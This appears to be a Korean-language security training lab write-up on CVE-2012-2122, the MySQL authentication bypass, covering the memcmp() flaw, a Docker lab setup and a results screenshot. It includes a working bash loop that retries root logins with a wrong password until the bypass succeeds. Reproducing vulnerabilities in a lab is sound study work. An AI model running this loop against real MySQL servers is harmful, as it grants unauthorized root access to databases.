# CVE-2012-2122

| whs 3기 유수빈

## 개요
1. **CVE 번호**: CVE-2012-2122
2. **취약점 명칭**: MySQL Authentication Bypass
3. **설명**: MySQL 서버에서 패스워드 인증 비교 시 잘못된 조건으로 인해, 낮은 확률로 비밀번호가 틀리더라도 root 계정으로 로그인 가능합니다.
4. **영향 버전**: MySQL 5.5.17 이하

## 요약
**CVE-2012-2122**는 MySQL과 MariaDB의 특정 버전에서 발견돤 **인증 우회 취약점**입니다.

- 취약한 MySQL 버전에서는 사용자의 비밀번호를 검증할 때, 내부적으로 'memcmp()'함수를 사용하여 해시값을 비교합니다.
- 해당 함수는 '-128 ~ 127' 범위의 값을 반환하지만, 해당 값을 'char'로 잘못 처리하면, '0'으로 인식하는 경우가 발생할 수 있습니다.
- 이를 통해 **1/256의 확률로 비밀번호가 틀려도 인증에 성공**하게 됩니다.
- 공격자는 이를 이용해 **임의의 비밀번호를 반복 시도**함으로써, **root 계정으로의 인증 우회를 달성하였습니다.

## 실습 환경 구성
- Docker 기반으로 구성
- 'docker-compose.yaml'을 통해 컨테이너 실행
- 컨테이너 내부에서 bash 반복문을 통해 인증 우회 취약점 재현

1. 실습 파일 생성
```bash
cd mysql-cve-2012-2122
```
- 도커 파일 생성
```bash
vi Dockerfile
```
내용 입력 후 저장

- entrypoint.sh 생성
```bash
vi entrypoint.sh
```
내용 입력 후 저장
권한 부여

- docker-compose.yaml 생성
```bash
vi docker-compose.yaml
```

2. 이미지 빌드, 컨테이너 실행
```bash
docker compose build
docker compose up -d
```

3. 컨테이너 안으로 들어가서 실행하기
```bash
docker exec -it mysql-cve bash
```
이후 아래 코드 실행

4. 컨테이너 종료
```bash
docker compose down
```

## 코드 
```bash
for i in {1..1000}; do
  echo "Try $i"
  mysql -u root --password=wrongpass -e "select user();" 2>/dev/null && echo "[+] Login Success!" && break
done
```

## 실행 결과
![cve 환경 구축](https://github.com/user-attachments/assets/cc1e767c-e72d-4d28-a655-38e3afbcba99)

운이 좋게 Try1에서 root 계정 로그인에 성공하였습니다.
